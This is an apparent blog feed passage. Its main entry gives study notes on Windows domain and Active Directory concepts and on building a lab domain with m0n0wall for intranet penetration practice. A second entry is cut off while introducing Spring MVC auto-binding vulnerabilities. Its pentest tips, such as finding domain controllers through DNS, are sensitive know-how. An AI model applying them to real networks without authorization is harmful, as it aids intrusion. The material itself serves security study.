    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-内网基本概念"><a href="#0x01-内网基本概念" class="headerlink" title="0x01 内网基本概念"></a>0x01 内网基本概念</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。在这个概念中，并不存在集中管理的节点，即无服务器和客户机的区分。</p><p>怎么设置工作组？——右键我的电脑-&gt;属性-&gt;更改设置-&gt;更改：</p><p><img src="/2020/02/15/内网渗透基础/1.png" alt=""></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p><h4 id="域控制器（DC）"><a href="#域控制器（DC）" class="headerlink" title="域控制器（DC）"></a>域控制器（DC）</h4><p>域控制器（Domain Controller，简写为DC）是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。域内的计算机若想互相访问，需要经过域控制器的审核。域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><p><img src="/2020/02/15/内网渗透基础/2.png" alt=""></p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>单域即只有一个域，通常满足小公司的需求。一般来说至少两个域服务器，一台作为DC，另一台作为备份DC。</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>出于管理和其他一些需求，需要在网络中划分多个域。其中第一个域称为父域，各分部的域称为该域的子域。</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p><img src="/2020/02/15/内网渗透基础/3.png" alt=""></p><p>多个域树可以组成一个域林。</p><h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的集合，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p><img src="/2020/02/15/内网渗透基础/4.png" alt=""></p><h4 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h4><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。</p><p>在前面域树中看到域树中的域名和DNS域名很像。因为域中的计算机是使用DNS来定位域控制器、服务器和其他计算机、网络服务的，因此域的名字就是DNS域的名字。</p><p>对于内网渗透而言，一般是通过寻找DNS服务器来确定域控制器的位置的（通常DNS服务器和域控制器配置在同一台机器上）。</p><h4 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h4><p>在域中，计算机一般分为：域控制器、成员服务器、客户机、独立服务器等。</p><p>其中域控制器是域所必需的，因为其存放活动目录数据库。</p><h5 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h5><p>DC的概念在前面已说过。</p><p>可以在网络中配置多态DC，用来分担用户的登录、访问等操作。多个DC可以一起工作，自动备份用户账户和活动目录数据，提高网络的安全性和稳定性。</p><h5 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h5><p>成员服务器是指安装了服务器OS并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。</p><p>成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等。</p><h5 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h5><p>客户机是域中用户使用的计算机，用户通过客户机和域中的账户就能登录访问域。</p><h5 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h5><p>独立服务器和域没啥关系。如果服务器没加入域，也没安装活动目录，则称为独立服务器。</p><p>独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务。</p><h4 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h4><p>组（Group）是用户账号的集合。通过向一组用户分配权限，就可以不必向每个用户分别分配权限。</p><p>下面看下几个类型的组。</p><h5 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h5><p>域本地组是指多域用户访问单域资源（访问同一个域），主要用于授权本域内资源的访问权限。</p><p>域本地组的成员可以来自域林中的任何域，域本地组用来访问同一域中的资源。</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>全局组是指单域用户访问多域资源（必须是一个域里面的用户），只能在创建该全局组的域中添加用户和全局组。</p><p>全局组的成员可包括其所在域中的其他组和账户，而且可在林中的任何域中指派权限。</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>通用组是指多域用户访问多域资源。</p><p>通用组的成员可包括域树或域林中任何域的其他组和账户，而且可在该域树或域林中的任何域中指派权限。</p><h5 id="小Trick"><a href="#小Trick" class="headerlink" title="小Trick"></a>小Trick</h5><ul><li>域本地组：来自全林，作用于本域；</li><li>全局组：来自本域，作用于全林；</li><li>通用组：来自全林，作用于全林；</li></ul><h5 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h5><p>A-G-DL-P策略（A：Account，用户账号；G：Global Group，全局组；DL：Domain Local Group，域本地组；P：Permission，资源权限）是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>A-G-DL-P策略是为了方便对用户进行组织和管理。当需要给一个用户添加某个权限时，只需要把这个用户添加到某一个域本地组中就可以了。</p><h5 id="内置组"><a href="#内置组" class="headerlink" title="内置组"></a>内置组</h5><p>在安装DC时，系统会自动生成一些组，即内置组。内置组内定义了一些常用的权限。通过将用户添加到内置组中，可以是用户获得相应的权限。</p><p>“Active Directory 用户和计算机”中的”Builtin”和”Users”组织单元中的组就是内置组，内置的域本地组在”Builtin”中，内置的全局组和通用组在”Users”中。</p><p>几个比较重要的域本地组权限：</p><ul><li>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，不仅是最具权力的一个组，也是在活动目录和域控制器中具有默认的管理员权限的组。该组的成员可以更改 Enterprise Admins、Schem Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。</li><li>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限。</li><li>打印机操作员组（Print Operators）的成员可以管理网络打印机，包括建立、管理及删除网络打印机，并可以在本地登录和关闭域控制器。</li><li>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置其权限，但是，不能更改隶属 Administrators 或 Domain Admins 组的账户，也不能修改这些组。Account Operators 可以在本地登录域控制器。在默认情况下，该组中没有成员。</li><li>服务器操作员组（Server Operators）的成员可以管理域服务器，包括建立/管理/删除任何服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器，以及变更服务器的系统时间等权限，并能关闭域控制器。在默认情况下，该组中没有成员。</li><li>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。</li></ul><p>几个比较重要的全局组、通用组的权限：</p><ul><li>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目录上均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组 中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 就对域中的所有计算机拥有了所有权。如果希望某用户成为域系统管理器，建议将该用户加至 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。</li><li>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。</li><li>架构管理员组（Schema Admins）是域森林根域中的一个组，可以修改活动目录域森林的模式。由于管理员组是提供活动目录和域控制器完整权限的域用户组，该组成员的资格是非常重要的。</li><li>域用户组（Domain Users）是所有域的成员。在预设的情况下，任何由我们建立的用户账户都是 Domain Users 组的成员，而任何由我们建立的计算机账户都是 Domain Computers 组的成员。因此，如果想让所有账户都具有某种资源存取权限，可以将该权限指定给 Domain Users 组，或者让 Domain Users 组属于具有该权限的组。Domain Users 组在预设的情况下是内建域局域 Users 组的成员。</li></ul><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录（Active Directory，简称AD）是指域环境中提供目录服务的组件。AD存储了有关网络对象（比如用户、组、计算机、共享资源、打印机等）的信息，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><p>域树/域林内的所有域共享一个活动目录，每个域只存储该域内的数据。</p><p>活动目录(Active Directory)主要提供以下功能：</p><ol><li>服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务：管理用户域账户、用户信息、企业通讯录（与电子邮件系统集成）、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。</li><li>资源管理：管理打印机、文件共享服务等网络资源。</li><li>桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑：支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。</li></ol><p><strong>域控制器与活动目录的区别</strong></p><p>AD库：活动目录数据库，是指用于将大型网络中众多的对象（如计算机、用户、用户组、打印机、共享文件等）分类存放并将检索信息整理好以便于查找、管理和使用这些对象的数据库。</p><p>可知，这个AD库是实现域环境的关键。<strong>如果内网中某台计算机安装了AD，那么它就成为了DC（用于存储活动目录数据库的计算机）</strong>。</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>安全域划分即将同一安全等级的计算机划入同一个的网段，这样这些计算机都拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL）。在一个用路由器连接的局域网中,我们可以将网络划分为三个区域：安全级别最高的LAN Area（内网），安全级别中等的DMZ区域和安全级别最低的Internet区域（外网）。三个区域因担负不同的任务而拥有不同的访问策略。</p><p>而安全域的划分一般分为DMZ和内网。</p><p>典型的中小型内网的安全域划分如图，这里有两个安全域即两个虚线划出来的安全边界：</p><p><img src="/2020/02/15/内网渗透基础/5.png" alt=""></p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>两个防火墙之间的空间被称为DMZ。安全性：<code>Internet &lt; DMZ &lt; 内网</code>。</p><p>DMZ（Demilitarized Zone），隔离区，也称非军事化区。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><p>DMZ的屏障功能：</p><ol><li>内网可以访问外网：内网的用户显然需要自由地访问外网。在这一策略中，防火墙需要进行源地址转换。</li><li>内网可以访问DMZ：此策略是为了方便内网用户使用和管理DMZ中的服务器。</li><li>外网不能访问内网：很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。</li><li>外网可以访问DMZ：DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li><li>DMZ访问内网有限制：很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。</li><li>DMZ不能访问外网：此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。在网络中，非军事区(DMZ)是指为不信任系统提供服务的孤立网段，其目的是把敏感的内部网络和其他提供访问服务的网络分开，阻止内网和外网直接通信，以保证内网安全。</li></ol><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p>内网在安全域划分中是安全级别最高的，其中可以分为办公区和核心区。</p><h2 id="0x02-内网域环境搭建"><a href="#0x02-内网域环境搭建" class="headerlink" title="0x02 内网域环境搭建"></a>0x02 内网域环境搭建</h2><p>内网渗透很大程度上就是域渗透，这里使用Windows Server 2012 R2、Windows Server 2008 R2和Windows 7搭建最为简单的迷你型域环境，其中将Windows Server 2012 R2服务器安装AD升级为DC，然后将Windows Server 2008 R2和Windows 7加入到该域中。此外，再安装Monowall来构建含有防火墙的二级内网。</p><p>下面推荐几个下载OS镜像的地址：</p><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li><li><a href="https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html" target="_blank" rel="noopener">https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html</a></li></ul><p>注意，为了 更逼真的内网环境，两台机子的虚拟网卡都选择Host-only模式。</p><h3 id="搭建域控制器"><a href="#搭建域控制器" class="headerlink" title="搭建域控制器"></a>搭建域控制器</h3><p>这里先安装好Windows Server 2012 R2系统，按如下步骤操作。</p><h4 id="设置IP"><a href="#设置IP" class="headerlink" title="设置IP"></a>设置IP</h4><p>这里设置服务器IP为192.168.1.1，而且一般域控制器和DNS服务器都是装在一起的，因此DNS服务器地址也写本机就好：</p><p><img src="/2020/02/15/内网渗透基础/6.png" alt=""></p><h4 id="更改计算机名"><a href="#更改计算机名" class="headerlink" title="更改计算机名"></a>更改计算机名</h4><p>在“控制面板-&gt;系统和安全-&gt;系统”中点击“更改设置-&gt;更改”，然后把计算机名改为“DC”，点击确定后重启计算机生效。</p><h4 id="安装域控制器和DNS服务"><a href="#安装域控制器和DNS服务" class="headerlink" title="安装域控制器和DNS服务"></a>安装域控制器和DNS服务</h4><p>Windows Server 2012 R2在开机时会自动打开服务器管理器，我们直接点击“添加角色和功能”：</p><p><img src="/2020/02/15/内网渗透基础/7.png" alt=""></p><blockquote><p>保持默认设置，单击“下 一步”按钮，进入“安装类型”页面。选择“基于角色或者基于功能的安装”选项，单击“下一 步”按钮，进入“服务器选择”选择页面。目前的服务器池中只有当前这一台机器，保持默认设置。单击“下一步”按钮，在“服务器角色”页面勾选“Active Directory 域服务”和“DNS 服务器”复选框：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/8.png" alt=""></p><p>在“功能”页面，保持默认设置，单击“下一步”按钮，进入“确认”页面。确认需要安装 的组件后，勾选“如果需要，自动重新启动目标服务器”复选框，然后单击安装：</p><p><img src="/2020/02/15/内网渗透基础/9.png" alt=""></p><h4 id="升级服务器"><a href="#升级服务器" class="headerlink" title="升级服务器"></a>升级服务器</h4><blockquote><p>Active Directory 域服务安装完成后，需要将此服务器提升为域控制器。单击“将此服务器提 升为域控制器”选项（如果不慎单击了“关闭”按钮，可以在“服务器管理器”页面中打开相关 页面），在右上角可以看到一个中间有“！”的三角形按钮。单击该按钮，提升服务器：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/10.png" alt=""></p><blockquote><p>AD 域服务安装完成。接着，进入“Active Directory 域服务配置向导”页面，在部署操作中单 击选中“添加新林”单选按钮并输入根域名（必须使用允许的 DNS 域命名约定） 。将根域名设置 为“hacke.testlab”：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/11.png" alt=""></p><blockquote><p>在“域控制器选项”页面，将林功能级别、域功能级别都设置为 Windows Server 2012 R2，如图所示。在创建新林时，在默认情况下选择 DNS 服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC） 。输入目录服务还原模式密码，在开机进入安全模式修复 AD 数据库时将使用此密码。 </p></blockquote><p><img src="/2020/02/15/内网渗透基础/12.png" alt=""></p><p>在 DNS 选项页面会出现关于 DNS 的警告。不用理会该警告，保持默认设置。单击“下一步” 按钮，进入“其他选项”页面，在 NetBIOS 域名（不支持DNS 域名的旧系统，如 Windows 98、 NT 系统，需要通过 NetBIOS 域名进行通信）页面保持默认设置。单击“下一步”按钮，进入“路 径”界面，指定数据库、日志、sysvol 的存放位置，其他选项保持默认设置。接着单击“下一步” 按钮，保持页面上的默认设置。当到了先决条件检查时，会检测出当前Administrator用户密码不符合要求，这是因为Administrator用户将成为域Administrator用户了：</p><p><img src="/2020/02/15/内网渗透基础/28.png" alt=""></p><p>此时我们去创建或修改Administrator用户的密码后再点击“重新运行先决条件检测”，这时候发现就OK了，直接单击“安装”即可。</p><p>安装完成后，需要重启服务器。重启完成后，需要使用域管理员账户（HACKE\Administrator）登录。此时在“服 务器管理器”页面就可以看到 AD DS、DNS 服务了，如图所示。 </p><p><img src="/2020/02/15/内网渗透基础/13.png" alt=""></p><h4 id="创建Active-Directory用户"><a href="#创建Active-Directory用户" class="headerlink" title="创建Active Directory用户"></a>创建Active Directory用户</h4><p>为Windows 7创建域控账户，在“Active Directory 用户和计算机”页面转到“Users”目录并单击右键，添加新用户：</p><p><img src="/2020/02/15/内网渗透基础/14.png" alt=""></p><p>创建一个testuser账户：</p><p><img src="/2020/02/15/内网渗透基础/15.png" alt=""></p><h3 id="配置Windows-7加入该域"><a href="#配置Windows-7加入该域" class="headerlink" title="配置Windows 7加入该域"></a>配置Windows 7加入该域</h3><p>将Windows 7系统加入该域，先设置IP地址为192.168.1.2，DNS地址为192.168.1.1， 然后查看设置并运行<code>ping hacker.testlab</code>命令进行测试：</p><p><img src="/2020/02/15/内网渗透基础/16.png" alt=""></p><p>接下来，将主机加入域，更改计算机名为“WIN7-x64”，将域名更改为 “hacker.testlab”。 单击“确定”按钮后，会弹出要求输入拥有权限的域账户名称和密码的对话框。 在这里，输入域管理员用户账号和密码：</p><p><img src="/2020/02/15/内网渗透基础/17.png" alt=""></p><p>操作成功后，会出现重启计算机的提示。用创建的testuser用户登录域即可。</p><p>此时，我们在DC中“Active Directory 用户和计算机”页面的Computers项可以看到Win7加入的计算机名：</p><p><img src="/2020/02/15/内网渗透基础/18.png" alt=""></p><p>当我们右键该项选择“所有任务-&gt;管理”时，会报如下错误，这是防火墙拦截的原因：</p><p><img src="/2020/02/15/内网渗透基础/19.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/20.png" alt=""></p><p>此时，为了方便，就直接将Win7上的防火墙关闭掉就好，当然在当前域环境下，在Win7进行相关操作时需要DC的adminsitrator用户权限才能操作的：</p><p><img src="/2020/02/15/内网渗透基础/21.png" alt=""></p><p>此时回到DC，我们就能成功管理这台Win7了：</p><p><img src="/2020/02/15/内网渗透基础/22.png" alt=""></p><h3 id="配置Windows-Server-2008-R2加入该域"><a href="#配置Windows-Server-2008-R2加入该域" class="headerlink" title="配置Windows Server 2008 R2加入该域"></a>配置Windows Server 2008 R2加入该域</h3><p>同Win7上面的操作一样，看下结果就好：</p><p><img src="/2020/02/15/内网渗透基础/29.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/30.png" alt=""></p><h3 id="通过防火墙m0n0wall构建二级内网"><a href="#通过防火墙m0n0wall构建二级内网" class="headerlink" title="通过防火墙m0n0wall构建二级内网"></a>通过防火墙m0n0wall构建二级内网</h3><h4 id="m0n0wall简介"><a href="#m0n0wall简介" class="headerlink" title="m0n0wall简介"></a>m0n0wall简介</h4><p>m0n0wall 是一个完整的、嵌入式的防火墙软件包，该软件包可以安装于嵌入式PC里。m0n0wall基于bare-bones version of FreeBSD，包括一个WEB服务器，PHP和另一些工具软件。整个系统的配置保存在一个XML文件当中。m0n0wall可能是第一个启动时通过PHP配置的UNIX系统。m0n0wall编写者认为m0n0wall不包含在第3层 和第4层防火墙的基础服务外的任何功能。因为m0n0wall是嵌入式的防火墙面向嵌入设备有限的CPU资源和记忆体资源。m0n0wall不允许登录： 在控制台没有登录提示符，（它被一个功能菜单代替） ,没有任何Telnet或SSH守护程序。</p><p>官网：<a href="https://m0n0.ch/wall/index.php" target="_blank" rel="noopener">https://m0n0.ch/wall/index.php</a></p><p>含中文版的下载地址：<a href="http://www.cat-home.org/?action=show&amp;id=158" target="_blank" rel="noopener">http://www.cat-home.org/?action=show&amp;id=158</a></p><h4 id="m0n0wall安装"><a href="#m0n0wall安装" class="headerlink" title="m0n0wall安装"></a>m0n0wall安装</h4><p>在VM中新建虚拟机，打开对应的iso文件，选择FreeBSD版本，内存选择10G即可。</p><p>都点击确认好之后，重点在于还需要给该虚拟机添加多一个网卡，即一个为Host-only模式用于内网，另一个为桥接模式连接外网：</p><p><img src="/2020/02/15/内网渗透基础/23.png" alt=""></p><p>之后启动虚拟机即可开启安装。</p><p>首先是需要安装到硬盘中，选择7：</p><p><img src="/2020/02/15/内网渗透基础/24.png" alt=""></p><p>接着选择硬盘，这里只有一块名为ad3的硬盘，选择它并输入确认y：</p><p><img src="/2020/02/15/内网渗透基础/25.png" alt=""></p><p>此时只需等待安装完成。</p><h4 id="网卡接口分配"><a href="#网卡接口分配" class="headerlink" title="网卡接口分配"></a>网卡接口分配</h4><p>重启之后进入如下界面，我们先输入1来进行网卡接口的分配：</p><p><img src="/2020/02/15/内网渗透基础/26.png" alt=""></p><p>如图输入，第一个设置LAN即内网网卡的填em0即通过Mac地址找到的对应Host-only那个网卡，第二个设置WAN即外网网卡的填em1即通过Mac地址找到的对应桥接那个网卡：</p><p><img src="/2020/02/15/内网渗透基础/27.png" alt=""></p><p>之后重启即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析自动绑定漏洞之Spring MVC</title>
    <link href="https://www.mi1k7ea.com/2020/02/12/%E6%B5%85%E6%9E%90%E8%87%AA%E5%8A%A8%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%E4%B9%8BSpring-MVC/"/>
    <id>https://www.mi1k7ea.com/2020/02/12/浅析自动绑定漏洞之Spring-MVC/</id>
    <published>2020-02-12T13:40:37.000Z</published>
    <updated>2020-02-13T15:18:48.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-MVC自动绑定漏洞"><a href="#0x01-Spring-MVC自动绑定漏洞" class="headerlink" title="0x01 Spring MVC自动绑定漏洞"></a>0x01 Spring MVC自动绑定漏洞</h2><h3 id="自动绑定漏洞"><a href="#自动绑定漏洞" class="headerlink" title="自动绑定漏洞"></a>自动绑定漏洞</h3><p>自动绑定功能在很多框架中都有实现，主要功能是允许软件框架自动将HTTP请求中的参数绑定到程序变量或对象中以便于开发者访问。</p><p>而自动绑定漏洞的漏洞点在于，攻击者可能将额外的HTTP请求参数绑定到一个对象上，使用这种方法来创建、修改、更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象，进而触发一些业务逻辑漏洞。</p><p>一般而言，自动绑定漏洞的发现是通过白盒审计的形式才能找到的。</p><h3 id="Spring-MVC中两个关键注解"><a href="#Spring-MVC中两个关键注解" class="headerlink" title="Spring  MVC中两个关键注解"></a>Spring  MVC中两个关键注解</h3><p>在Spring MVC框架中与自动绑定漏洞相关的注解有如下两个。</p><h4 id="ModelAttribute注解"><a href="#ModelAttribute注解" class="headerlink" title="@ModelAttribute注解"></a>@ModelAttribute注解</h4><p>通过@ModelAttribute注解可实现以下两个功能：</p><p><strong>1、绑定请求参数到实体对象（表单的命令对象）</strong></p><p>@ModelAttribute注解运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用。</p><p>如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> UserForm user) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"zhangsan"</span>.equals(uname) &amp;&amp; <span class="string">"123456"</span>.equals(upass)) &#123;</span><br><span class="line">        logger.info(<span class="string">"成功"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        logger.info(<span class="string">"失败"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"register"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中<code>@ModelAttribute（&quot;user&quot;）UserForm user</code>语句的功能有两个：</p><ul><li>将请求参数的输入封装到user对象中。</li><li>创建UserForm实例。</li></ul><p>以“user”为键值存储在Model对象中，和<code>model.addAttribute(&quot;user&quot;，user)</code>语句的功能一样。如果没有指定键值，即<code>@ModelAttribute UserForm user</code>，那么在创建UserForm实例时以“userForm”为键值存储在Model对象中，和<code>model.addAtttribute(&quot;userForm&quot;, user)</code>语句的功能一样。</p><p><strong>2、注解一个非请求处理方法</strong></p><p>被@ModelAttribute注解的方法将在每次调用该控制器类的请求处理方法前被调用。这种特性可以用来控制登录权限，当然控制登录权限的方法有很多，例如拦截器、过滤器等。</p><p>使用该特性控制登录权限，创建BaseController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ModelAttribute</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">isLogin</span><span class="params">(HttpSession session)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">"user"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"没有权限"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建ModelAttributeController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 